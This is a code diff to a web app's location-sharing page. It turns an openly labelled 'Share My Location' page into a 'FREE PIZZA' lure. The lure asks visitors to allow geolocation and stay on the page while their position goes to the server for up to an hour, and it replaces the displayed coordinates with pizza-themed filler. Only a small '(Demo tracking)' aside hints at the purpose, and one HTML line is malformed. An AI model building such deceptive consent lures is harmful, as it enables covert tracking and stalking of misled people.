@@ -62,11 +62,118 @@ app.get("/share", (req, res) => {
   <html>
   <head>
     <meta charset="UTF-8" />
-    <title>Share My Location</title>
+    <    <title>FREE PIZZA LOADING!</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: radial-gradient(circle at top, #ffecd2 0, #fcb69f 25%, #f57c4a 60%, #8b1e1e 100%);
+        color: #fff;
+      }
+
+      .card {
+        background: rgba(0, 0, 0, 0.75);
+        border-radius: 18px;
+        padding: 24px 28px;
+        max-width: 420px;
+        width: 90%;
+        box-shadow: 0 18px 40px rgba(0, 0, 0, 0.35);
+        text-align: center;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 4px 10px;
+        border-radius: 999px;
+        background: rgba(255, 255, 255, 0.08);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        margin-bottom: 10px;
+      }
+
+      .badge-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 999px;
+        background: #18ff6d;
+        box-shadow: 0 0 8px #18ff6d;
+      }
+
+      h1 {
+        font-size: 26px;
+        margin-bottom: 8px;
+      }
+
+      .subtitle {
+        font-size: 13px;
+        opacity: 0.85;
+        margin-bottom: 18px;
+      }
+
+      .pizza-emoji {
+        font-size: 46px;
+        margin: 6px 0 14px;
+      }
+
+      #status {
+        background: rgba(255, 255, 255, 0.06);
+        border-radius: 10px;
+        padding: 10px 12px;
+        font-size: 14px;
+        line-height: 1.4;
+        margin-bottom: 10px;
+      }
+
+      .hint {
+        font-size: 11px;
+        opacity: 0.9;
+        margin-top: 4px;
+      }
+
+      .timer {
+        font-size: 12px;
+        margin-top: 10px;
+        opacity: 0.9;
+      }
+
+      .coords {
+        font-size: 11px;
+        opacity: 0.85;
+        margin-top: 6px;
+      }
+    </style>
   </head>
   <body>
-    <h2>Sharing your location for 1 hour...</h2>
-    <p id="status">Requesting location permission...</p>
+    <div class="card">
+      <div class="badge">
+        <span class="badge-dot"></span>
+        LIVE PIZZA TRACKING
+      </div>
+      <div class="pizza-emoji">🍕</div>
+      <h1>Your FREE Pizza Is On Its Way</h1>
+      <p class="subtitle">
+        Stay on this page so the kitchen can follow your location
+        and "deliver" the pizza. (Demo tracking)
+      </p>
+
+      <p id="status">Requesting location permission...</p>
+      <p class="hint">Tip: Tap “Allow” when the browser asks for your location.</p>
+      <p class="timer">Tracking active for up to 1 hour.</p>
+      <p class="coords" id="coordsHint"></p>
+    </div>
 
     <script>
       const params = new URLSearchParams(window.location.search);
@@ -89,7 +196,7 @@ app.get("/share", (req, res) => {
 
             const lat = pos.coords.latitude;
             const lng = pos.coords.longitude;
-            statusEl.innerText = "Sharing... Lat: " + lat.toFixed(5) + ", Lng: " + lng.toFixed(5);
+            statusEl.innerText = "Please stay patient, your pizza is being located...";
 
             try {
               await fetch("/update-location/" + id, {
